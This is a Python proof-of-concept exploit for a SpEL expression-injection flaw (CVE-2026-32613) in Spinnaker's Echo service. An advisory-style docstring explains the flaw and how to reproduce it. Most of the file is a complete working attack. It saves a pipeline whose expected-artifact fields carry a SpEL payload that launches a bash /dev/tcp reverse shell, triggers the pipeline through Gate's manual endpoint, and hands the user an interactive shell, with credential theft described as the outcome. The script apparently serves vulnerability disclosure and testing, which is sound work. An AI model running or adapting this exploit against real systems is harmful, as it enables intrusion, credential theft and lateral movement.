#!/usr/bin/env python3
"""
uv run --no-project --with requests echo_rce_via_spel.py --app APPNAME [OPTIONS]

Finding: Untrusted expectedArtifacts Evaluated as SpEL (RCE)
CVE: CVE-2026-32613
SEVERITY: Critical (10.0)
CWE: CWE-917 (Improper Neutralization of Special Elements used in an
     Expression Language Statement)

SUMMARY:
  Spinnaker pipelines support "expected artifacts" — declarations of
  artifacts a pipeline expects to receive from its trigger. These
  declarations are evaluated using Spring Expression Language (SpEL)
  by the Echo service when a pipeline execution is initiated. An attacker
  with EXECUTE (i.e. WRITE) access to any application can save a pipeline
  containing a malicious SpEL expression in an expectedArtifact field,
  then invoke it via Gate's manual execution endpoint. Echo evaluates the
  expression with no restrictions, giving the attacker arbitrary code
  execution on the Echo service as the process user (typically root).

VULNERABLE CODE:
  echo/echo-pipelinetriggers/src/main/java/.../postprocessors/
  ExpectedArtifactExpressionEvaluationPostProcessor.java, line 47:
    EvaluationContext evaluationContext = new StandardEvaluationContext(inputPipeline);

  StandardEvaluationContext grants full reflective access to the JVM —
  instantiating arbitrary classes, calling any method, accessing the
  filesystem and network. Every other SpEL evaluation point in
  Spinnaker uses a hardened context (AllowListTypeLocator,
  FilteredMethodResolver) that blocks this. This is the only one
  that does not.

  The manual execution endpoint (POST /pipelines/v2/{app}/{pipeline}) routes
  through Echo's ManualEventHandler, which overrides getMatchingPipelines()
  without calling super — skipping the canAccessApplication() filter that
  normally enforces runAsUser on automated triggers. No webhook trigger is
  required in the pipeline definition, and no service account is needed even
  for applications that restrict EXECUTE to specific roles.

IMPACT:
  Any authenticated user with WRITE on an application can achieve Remote
  Code Execution on the Echo service JVM with full OS-level access. This
  enables exfiltration of the process environment, which in production
  Spinnaker deployments typically contains AWS credentials
  (AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY), database connection strings,
  service account tokens, and internal service URLs — escalating from code
  execution to full credential theft and lateral movement.

REPRODUCTION:
  1. Save pipeline with SpEL payload in expectedArtifacts via POST /pipelines
     (no triggers required)
  2. Invoke via POST /pipelines/v2/{application}/{pipelineName}
  3. Echo evaluates the SpEL — spawns a reverse shell
  4. Attacker gets interactive shell on the Echo container

REQUIREMENTS:
  - Gate accessible (port 8084)
  - Echo running with pipeline trigger processing enabled
  - An application the user has EXECUTE (i.e. WRITE) access to
  - Authentication credentials (one of):
    - Basic auth: --gate-user / --gate-password (LDAP or file-based)
    - Bearer token: --gate-token (OAuth2/OIDC)
    - Session cookie: --gate-cookie (any auth backend, obtain from browser)

EXAMPLES:
  # Unrestricted app:
  uv run --no-project --with requests echo_rce_via_spel.py \\
    --app testapp --gate-user devuser --gate-password devuser123

  # Restricted app — no service account needed:
  uv run --no-project --with requests echo_rce_via_spel.py \\
    --app targetapp --gate-user devuser --gate-password devuser123
"""

import argparse
import os
import select
import socket
import sys
import termios
import threading
import time
import tty

import requests


def interactive_shell(sock):
    """Bridge stdin/stdout to a socket for an interactive shell session."""
    old_tty = termios.tcgetattr(sys.stdin)
    try:
        tty.setraw(sys.stdin.fileno())
        while True:
            r, _, _ = select.select([sock, sys.stdin], [], [], 0.5)
            if sock in r:
                data = sock.recv(4096)
                if not data:
                    break
                # Remote bash has no pty — raw \n without \r.
                # Translate so the terminal carriage-returns properly.
                sys.stdout.buffer.write(data.replace(b"\n", b"\r\n"))
                sys.stdout.flush()
            if sys.stdin in r:
                data = os.read(sys.stdin.fileno(), 1024)
                if not data:
                    break
                sock.send(data)
    finally:
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tty)


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2026-32613: SpEL RCE via expectedArtifacts in Echo")
    parser.add_argument("--gate-url", default="http://localhost:8084")
    parser.add_argument("--gate-user", default=None, help="Username for basic auth (LDAP/file)")
    parser.add_argument("--gate-password", default=None, help="Password for basic auth")
    parser.add_argument("--gate-token", default=None, help="Bearer token (OAuth2/OIDC)")
    parser.add_argument("--gate-cookie", default=None,
                        help="Session cookie value (e.g. 'SESSION=abc123' from browser)")
    parser.add_argument("--shell-port", type=int, default=9997,
                        help="Local port to listen on for reverse shell (default: 9997)")
    parser.add_argument("--shell-host", default="host.docker.internal",
                        help="Address the Echo container uses to reach this machine "
                             "(default: host.docker.internal for Docker Desktop)")
    parser.add_argument("--app", required=True,
                        help="Spinnaker application the authenticated user has EXECUTE access to")
    args = parser.parse_args()

    # Build authenticated session
    session = requests.Session()
    auth_method = "none"
    if args.gate_user:
        session.auth = (args.gate_user, args.gate_password or "")
        auth_method = f"basic ({args.gate_user})"
    if args.gate_token:
        session.headers["Authorization"] = f"Bearer {args.gate_token}"
        auth_method = "bearer token"
    if args.gate_cookie:
        session.headers["Cookie"] = args.gate_cookie
        auth_method = "session cookie"

    print("[*] CVE-2026-32613: SpEL RCE via expectedArtifacts in Echo")
    print(f"[*] Gate: {args.gate_url}")
    print(f"[*] Auth: {auth_method}")
    print(f"[*] Trigger path: POST /pipelines/v2/{args.app}/<pipeline>")
    print(f"[*] No webhook trigger required. No service account required.")
    print()

    # --- Step 1: Verify Gate is up ---
    print("[*] Step 1: Checking Gate...")
    try:
        r = requests.get(f"{args.gate_url}/health", timeout=10)
        print(f"[+] Gate health: {r.json().get('status')}")
    except Exception as e:
        print(f"[-] Gate not accessible: {e}")
        sys.exit(1)

    # --- Step 2: Save pipeline with reverse shell SpEL payload ---
    print()
    print("[*] Step 2: Saving pipeline with SpEL reverse shell payload...")

    shell_cmd = f"bash -i >& /dev/tcp/{args.shell_host}/{args.shell_port} 0>&1"
    spel_payload = (
        "${new java.lang.ProcessBuilder("
        "new String[]{'bash','-c','" + shell_cmd + "'}"
        ").start()}"
    )

    pipeline_name = "spel-rce-test-pipeline"

    # Get existing pipeline ID if it exists, to do an update
    existing_id = None
    try:
        r = session.get(f"{args.gate_url}/applications/{args.app}/pipelineConfigs", timeout=10)
        if r.status_code == 200:
            for p in r.json():
                if p.get("name") == pipeline_name:
                    existing_id = p.get("id")
                    break
    except Exception:
        pass

    pipeline = {
        "name": pipeline_name,
        "application": args.app,
        "expectedArtifacts": [
            {
                "id": "spel-rce-artifact",
                "displayName": spel_payload,
                "matchArtifact": {
                    "type": "embedded/base64",
                    "name": spel_payload,
                },
                "defaultArtifact": {
                    "type": "embedded/base64",
                    "name": "default",
                    "reference": "dGVzdA==",
                },
                "useDefaultArtifact": True,
                "usePriorArtifact": False,
            }
        ],
        "triggers": [],
        "stages": [
            {
                "type": "wait",
                "name": "Wait",
                "waitTime": 5,
            }
        ],
    }
    if existing_id:
        pipeline["id"] = existing_id

    print(f"    Pipeline:      {pipeline_name}")
    print(f"    SpEL payload:  ${{new java.lang.ProcessBuilder(...).start()}}")
    print(f"    Reverse shell: {args.shell_host}:{args.shell_port}")
    print(f"    Triggers:      [] (none — not required for manual path)")

    r = session.post(f"{args.gate_url}/pipelines", json=pipeline, timeout=30)
    if r.status_code not in (200, 201, 202):
        print(f"[-] Pipeline save failed: {r.status_code} {r.text[:300]}")
        sys.exit(1)
    print("[+] Pipeline saved successfully")

    # --- Step 3: Start listener and fire manual trigger ---
    # ManualEventHandler falls back to querying Front50 directly if the pipeline
    # is not yet in Echo's cache, so no full cache-refresh cycle is needed.
    print()
    print(f"[*] Step 3: Waiting for Front50 to persist pipeline...")
    time.sleep(5)
    print(f"[+] Starting listener on 0.0.0.0:{args.shell_port}")

    try:
        srv = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
        srv.bind(("::", args.shell_port))
    except OSError:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", args.shell_port))
    srv.listen(1)
    srv.settimeout(90)

    def fire_manual_trigger():
        time.sleep(1)
        for attempt in range(5):
            try:
                r = session.post(
                    f"{args.gate_url}/pipelines/v2/{args.app}/{pipeline_name}",
                    json={},
                    timeout=15,
                )
                print(f"[*] Manual trigger attempt {attempt + 1}: HTTP {r.status_code}")
            except Exception as e:
                print(f"[*] Manual trigger attempt {attempt + 1}: {e}")
            time.sleep(15)

    trigger_thread = threading.Thread(target=fire_manual_trigger, daemon=True)
    trigger_thread.start()
    print(f"[*] Firing manual trigger (POST /pipelines/v2/{args.app}/{pipeline_name})...")

    try:
        conn, addr = srv.accept()
    except socket.timeout:
        print()
        print("[-] No reverse shell connection received after 90s.")
        print("    Possible reasons:")
        print(f"    - Echo container cannot reach {args.shell_host}:{args.shell_port}")
        print("    - bash /dev/tcp not available in the container")
        print("    - SpEL expression was not evaluated (check Echo logs)")
        srv.close()
        sys.exit(1)

    srv.close()

    print(f"[+] Connection from {addr[0]}:{addr[1]}")
    print()
    print("=" * 60)
    print("[+] REMOTE CODE EXECUTION CONFIRMED — Echo service")
    print("[+] Trigger: POST /pipelines/v2 (no webhook, no service account)")
    print("=" * 60)
    print()
    print("  You now have a shell on the Echo container.")
    print("  Try: id, env, whoami, cat /etc/os-release")
    print("  Type 'exit' or Ctrl+C to disconnect.")
    print()

    try:
        interactive_shell(conn)
    except KeyboardInterrupt:
        pass
    finally:
        conn.close()
        print()
        print("[*] Shell closed.")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print()
        sys.exit(130)
